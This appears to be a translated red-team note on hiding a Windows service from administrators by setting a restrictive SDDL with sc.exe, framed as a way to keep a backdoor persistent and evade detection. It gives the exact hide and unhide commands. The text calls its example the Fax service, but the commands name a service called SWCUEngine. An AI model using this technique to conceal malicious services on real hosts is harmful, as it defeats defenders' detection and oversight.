	Translate from: https://www.sans.org/blog/red-team-tactics-hiding-windows-services/
	Windows的一个功能允许红队或攻击者将服务隐藏起来，从而为逃避基于主机的常见威胁搜寻技术的检测提供了机会。
	这里假设Fax服务是我们的恶意文件或后门
	打开services.msc可以看到服务
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/849.png)
	
	执行命令可以看到服务
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/850.png)

	管理员权限下执行以下命令，安全标识符定义语言(SDDL)
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/851.png)

	& $env:SystemRoot\System32\sc.exe sdset SWCUEngine "D:(D;;DCLCWPDTSD;;;IU)(D;;DCLCWPDTSD;;;SU)(D;;DCLCWPDTSD;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)"
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/852.png)
	
	可以看到已经查询不到了
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/853.png)

	在红队或渗透测试中，这可能是一种有用的技术，可以在受感染主机上保持持久性。重启后，隐藏的服务也会自动启动。
	取消隐藏的命令
	& $env:SystemRoot\System32\sc.exe sdset SWCUEngine "D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;  CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)"
